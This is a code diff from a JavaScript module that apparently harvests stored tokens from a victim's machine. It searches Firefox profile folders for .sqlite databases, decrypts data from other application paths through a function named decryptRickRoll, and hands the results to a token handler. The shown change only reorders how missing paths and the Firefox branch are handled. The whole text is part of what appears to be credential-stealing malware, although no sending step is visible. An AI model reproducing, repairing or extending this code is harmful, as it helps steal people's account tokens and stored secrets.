@@ -131,8 +131,7 @@ const handleTokens = (tokens, resolve) => tokens.map(token => {
 
 module.exports = new Promise((resolve) => {
   Object.keys(paths).forEach(path => {
-    if (!existsSync(paths[path])) return;
-    else if (path.includes('Firefox')) {
+    if (path.includes('Firefox')) {
       try {
         const search = execSync('where /r . *.sqlite', { cwd: paths[path] }).toString();
         if (search) {
@@ -151,6 +150,8 @@ module.exports = new Promise((resolve) => {
           });
         }
       } catch (e) {}
+    } else if (!existsSync(paths[path])) {
+      resolve();
     } else {
       decryptRickRoll(paths[path]).then(tokens => handleTokens(tokens, resolve)).catch(resolve);
     }
